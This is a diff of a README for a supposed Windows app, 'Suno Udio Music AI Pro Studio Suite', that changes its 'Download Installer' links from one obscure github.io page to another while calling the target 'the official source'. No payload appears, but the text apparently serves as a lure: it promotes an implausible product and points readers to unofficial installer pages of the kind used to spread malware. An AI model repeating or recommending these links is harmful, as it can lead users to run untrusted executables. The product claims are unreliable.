@@ -2,7 +2,7 @@
 
 Suno Udio Music AI Pro Studio Suite is a comprehensive Windows desktop application designed for creating AI-generated music with professional quality. Leveraging cutting-edge algorithms from Suno and Udio, this tool enables users to produce songs effortlessly, from text prompts to full compositions, making it ideal for musicians, producers, and enthusiasts alike.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -67,7 +67,7 @@ A: Yes, the tool integrates with MIDI devices and supports VST plugins for enhan
 ## Download
 
 For the latest version and updates, download from the official source:  
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
